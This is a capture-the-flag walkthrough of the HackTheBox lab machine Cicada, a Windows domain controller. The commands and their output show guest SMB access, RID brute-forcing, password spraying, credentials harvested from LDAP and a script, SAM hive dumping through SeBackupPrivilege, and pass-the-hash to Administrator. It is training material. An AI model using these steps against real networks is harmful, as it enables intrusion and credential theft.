---
title: "HackTheBox - Cicada"
author: Nasrallah
description: ""
date: 2025-02-15 07:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, windows, easy, ad, bloodhound, ldap]
img_path: /assets/img/hackthebox/machines/cicada
image:
    path: cicada.png
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---

[Cicada](https://hacktheboxltd.sjv.io/Nasrallah?u=https://app.hackthebox.com/machines/cicada) from [HackTheBox](https://hacktheboxltd.sjv.io/anqPJZ).

## **Enumeration**

### nmap

We start an Nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.11.35                                                               
Host is up (0.11s latency).
Not shown: 989 filtered tcp ports (no-response) 
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-13 15:52:33Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16                                                        
|_Not valid after:  2025-08-22T20:24:16                                                        
|_ssl-date: TLS randomness does not represent time
445/tcp  open  microsoft-ds?          
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-12-13T15:53:16
|_  start_date: N/A
|_clock-skew: 7h00m01s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

The target is windows domain controller.

### SMB

The first I usually start with is SMB, we can use `nxc` to enumerate it.

```terminal
[★]$ nxc smb 10.10.11.35 -u 'guest' -p '' --shares                                                                                                                                        
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)                                 
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\guest:                                                                                                                     
SMB         10.10.11.35     445    CICADA-DC        [*] Enumerated shares
SMB         10.10.11.35     445    CICADA-DC        Share           Permissions     Remark
SMB         10.10.11.35     445    CICADA-DC        -----           -----------     ------
SMB         10.10.11.35     445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.10.11.35     445    CICADA-DC        C$                              Default share
SMB         10.10.11.35     445    CICADA-DC        DEV                                        
SMB         10.10.11.35     445    CICADA-DC        HR              READ            
SMB         10.10.11.35     445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.10.11.35     445    CICADA-DC        NETLOGON                        Logon server share 
SMB         10.10.11.35     445    CICADA-DC        SYSVOL                          Logon server share
```

We managed to login as `guest` with no password.

We found the share `HR` that we can read.

Let's use `smbclient` to connect to it.

```terminal
[★]$ smbclient //10.10.11.35/HR -N                                                                                                                                                        
Try "help" to get a list of possible commands.                                                                                                                                                
smb: \> ls
  .                                   D        0  Thu Mar 14 12:29:09 2024
  ..                                  D        0  Thu Mar 14 12:21:29 2024
  Notice from HR.txt                  A     1266  Wed Aug 28 18:31:48 2024

                4168447 blocks of size 4096. 431515 blocks available
smb: \> mget *.txt
Get file Notice from HR.txt? y
getting file \Notice from HR.txt of size 1266 as Notice from HR.txt (2.1 KiloBytes/sec) (average 2.1 KiloBytes/sec)
smb: \> exit
```

We found a text file and downloaded it, Let's see what it holds.

```text
Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8

To change your password:

1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.
2. Once logged in, navigate to your account settings or profile settings section.
3. Look for the option to change your password. This will be labeled as "Change Password".
4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
5. After changing your password, make sure to save your changes.

Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.

If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.

Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

Best regards,
Cicada Corp
```

It's an email for new hires giving them their default password.

Since the user `guest` is enabled, let's use it to enumerate users.

```terminal
[★]$ nxc smb 10.10.11.35 -u 'guest' -p '' --users 
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\guest:
```

Couldn't get a result with the `--users` option, let's try with `--rid-brute`

```terminal
[★]$ nxc smb 10.10.11.35 -u 'guest' -p '' --rid-brute                                                                                                                          [2595/2795]
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\guest: 
SMB         10.10.11.35     445    CICADA-DC        498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        501: CICADA\Guest (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        512: CICADA\Domain Admins (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        513: CICADA\Domain Users (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        514: CICADA\Domain Guests (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        515: CICADA\Domain Computers (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        516: CICADA\Domain Controllers (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        517: CICADA\Cert Publishers (SidTypeAlias)
SMB         10.10.11.35     445    CICADA-DC        518: CICADA\Schema Admins (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        519: CICADA\Enterprise Admins (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        520: CICADA\Group Policy Creator Owners (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        521: CICADA\Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        522: CICADA\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        525: CICADA\Protected Users (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        526: CICADA\Key Admins (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        527: CICADA\Enterprise Key Admins (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        553: CICADA\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.11.35     445    CICADA-DC        571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.35     445    CICADA-DC        572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.35     445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1101: CICADA\DnsAdmins (SidTypeAlias)
SMB         10.10.11.35     445    CICADA-DC        1102: CICADA\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        1103: CICADA\Groups (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1109: CICADA\Dev Support (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)
```

It worked and got the users back, we clean it a little and end with the following list of users.

```terminal
CICADA\john.smoulder
CICADA\sarah.dantelia
CICADA\michael.wrightson
CICADA\david.orelious
CICADA\emily.oscars
```

Now let's do a password spray attack.

```terminal
[★]$ nxc smb 10.10.11.35 -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
```

The user `michael.wrightson` is using the password. Unfortunately we can login via winrm.

### Bloodhound

Let's enumerate the box using `bloodhound.py`

```terminal
[★]$ bloodhound.py -d cicada.htb -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' -ns 10.10.11.35 -dc cicada.htb -c all
INFO: Found AD domain: cicada.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: cicada.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: cicada.htb
INFO: Found 9 users
INFO: Found 54 groups
INFO: Found 3 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: CICADA-DC.cicada.htb
INFO: Done in 00M 22S
```

The user `michael` doesn't have anything interesting.

### Ldap

Next thing i tried is using `ldapsearch`. I extracted the users info using the following command.

```bash
ldapsearch -x -H ldap://cicada.htb -D michael.wrightson@cicada.htb -w 'Cicada$M6Corpb*@Lp#nZp!8' -b "CN=users,DC=cicada,DC=htb"
```

Looking throught the output we find the following.

```terminal
# David Orelious, Users, cicada.htb                                                                                                                                                           
dn: CN=David Orelious,CN=Users,DC=cicada,DC=htb                                                                                                                                               
objectClass: top                                                                                                                                                                              
objectClass: person                                                                                                                                                                           
objectClass: organizationalPerson                                                                                                                                                             
objectClass: user                                                                                                                                                                             
cn: David Orelious                                                                                                                                                                            
sn: Orelious                                                                                   
description: Just in case I forget my password is aRt$Lp#7t*VQ!3                               
givenName: David                                                                               
initials: D                             
distinguishedName: CN=David Orelious,CN=Users,DC=cicada,DC=htb                                 
instanceType: 4                                                                                
whenCreated: 20240314121729.0Z                                                                 
whenChanged: 20240828172557.0Z                                                                 
uSNCreated: 20569                                                                              
uSNChanged: 122945                                                                             
name: David Orelious                                                                           
objectGUID:: vLT9wKgMqkOmSQuC/2CSVw==                                                          
userAccountControl: 66048                                                                      
badPwdCount: 3                                                                                                                                                                                
codePage: 0                                                                                                                                                                                   
countryCode: 0                                                                                 
badPasswordTime: 133785792443033354                                                            
lastLogoff: 0                                                                                                                                                                                 
lastLogon: 133549579419992639                                                                                                                                                                 
pwdLastSet: 133548922495138483                                                                                                                                                                
primaryGroupID: 513                                                                                                                                                                           
objectSid:: AQUAAAAAAAUVAAAAjC22Nimt01QHG0u8VAQAAA==                                           
accountExpires: 9223372036854775807                                                            
logonCount: 0                                                                                                                                                                                 
sAMAccountName: david.orelious
sAMAccountType: 805306368                                                                      
userPrincipalName: david.orelious@cicada.htb                  
```

We see that user `david.orelious` wrote his password on the description.

Running a user enumeration with `--users` as `michael` also shows the password.

```terminal
[★]$ nxc smb 10.10.11.35 -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --users        
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
SMB         10.10.11.35     445    CICADA-DC        -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.10.11.35     445    CICADA-DC        Administrator                 2024-08-26 20:08:03 0       Built-in account for administering the computer/domain 
SMB         10.10.11.35     445    CICADA-DC        Guest                         2024-08-28 17:26:56 0       Built-in account for guest access to the computer/domain 
SMB         10.10.11.35     445    CICADA-DC        krbtgt                        2024-03-14 11:14:10 0       Key Distribution Center Service Account 
SMB         10.10.11.35     445    CICADA-DC        john.smoulder                 2024-03-14 12:17:29 0        
SMB         10.10.11.35     445    CICADA-DC        sarah.dantelia                2024-03-14 12:17:29 0        
SMB         10.10.11.35     445    CICADA-DC        michael.wrightson             2024-03-14 12:17:29 0        
SMB         10.10.11.35     445    CICADA-DC        david.orelious                2024-03-14 12:17:29 0       Just in case I forget my password is aRt$Lp#7t*VQ!3 
SMB         10.10.11.35     445    CICADA-DC        emily.oscars                  2024-08-22 21:20:17 0
```

We can also see the password on bloodhound.

![bloodhound](1.png)

## **Foothold**

Users david can't login via `winrm`, I'll list shares and see if we can read any other shares.

```terminal
[★]$ nxc smb 10.10.11.35 -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' --shares                                                                                                                 
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)                                 
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3                                                                                              
SMB         10.10.11.35     445    CICADA-DC        [*] Enumerated shares                                                                                                                     
SMB         10.10.11.35     445    CICADA-DC        Share           Permissions     Remark                                                                                                    
SMB         10.10.11.35     445    CICADA-DC        -----           -----------     ------                                                                                                    
SMB         10.10.11.35     445    CICADA-DC        ADMIN$                          Remote Admin                                                                                              
SMB         10.10.11.35     445    CICADA-DC        C$                              Default share                                                                                             
SMB         10.10.11.35     445    CICADA-DC        DEV             READ                                                                                                                      
SMB         10.10.11.35     445    CICADA-DC        HR              READ                                                                                                                      
SMB         10.10.11.35     445    CICADA-DC        IPC$            READ            Remote IPC                                                                                                
SMB         10.10.11.35     445    CICADA-DC        NETLOGON        READ            Logon server share                                                                                        
SMB         10.10.11.35     445    CICADA-DC        SYSVOL          READ            Logon server share 
```

We can read the `Dev` share.

```terminal
[★]$ smbclient //10.10.11.35/DEV -U david.orelious                                                                                                                                        
Password for [WORKGROUP\david.orelious]:                                                                                                                                                      
Try "help" to get a list of possible commands.                                                                                                                                                
smb: \> ls                                                                                                                                                                                    
  .                                   D        0  Thu Mar 14 12:31:39 2024                                                                                                                    
  ..                                  D        0  Thu Mar 14 12:21:29 2024                                                                                                                    
  Backup_script.ps1                   A      601  Wed Aug 28 18:28:22 2024                                                                                                                    
                                                                                                                                                                                              
                4168447 blocks of size 4096. 430469 blocks available                                                                                                                          
smb: \> mget *.ps1                                                                                                                                                                            
Get file Backup_script.ps1? y                                                                                                                                                                 
getting file \Backup_script.ps1 of size 601 as Backup_script.ps1 (1.4 KiloBytes/sec) (average 1.4 KiloBytes/sec)                                                                              
smb: \>                                                                                                                                                                                       
smb: \> exit 
```

We found a powershell script, let's check it out.

```powershell
$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss" 
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
```

It's a backup script that has `emily`'s credentials.

Now we can use `evil-winrm` to get a shell.

```terminal
[★]$ evil-winrm -i 10.10.11.35 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'                 
                                         
Evil-WinRM shell v3.5
                                         
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                         
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                         
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents>
```

## **Privilege Escalation**

Checking our privileges we have the `SeBackupPrivilege`

```terminal
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

This allows us to read any file on the system.

Let's create a copy of the `sam` and `system` files which contains the credentials of the machine.

```terminal
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> reg save HKLM\system .\system                                                                                                         
The operation completed successfully.                                                                                                                                                         
                                                                                                                                                                                              
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> reg save HKLM\sam .\sam                                                                                                               
The operation completed successfully.
```

Now we download them to our machine.

```terminal
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> download sam
                                                                                               
Info: Downloading C:\Users\emily.oscars.CICADA\Documents\sam to sam
                                                                                                                                                                                              
Info: Download successful!                                                                     
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> download system
                                        
Info: Downloading C:\Users\emily.oscars.CICADA\Documents\system to system
                                                                                               
Info: Download successful!                                                                                                                                                                    
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents>
```

And with the help of `secretsdump` we can extract the password hashes.

```terminal
[★]$ impacket-secretsdump -sam sam -system system local
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Cleaning up... 
```

The we got the hash of local administrator, we can do a pass-the-hash to get a shell as administrator.

```terminal
[★]$ evil-winrm -i 10.10.11.35 -u 'administrator' -H 2b87e7c93a3e8a0ea4a581937016f341                                                                                                     
                                                                                                                                                                                              
Evil-WinRM shell v3.5                                                                          
                                                                                                                                                                                              
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                       
                                                                                                                                                                                              
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                                                                               
Info: Establishing connection to remote endpoint    
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

We can also get the root flag from emily's shell by copying it to a directory and read it from there.

```shell
robocopy "C:\Users\administrator\desktop" "C:\Users\emily.oscars.CICADA\documents" root.txt /B
```

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
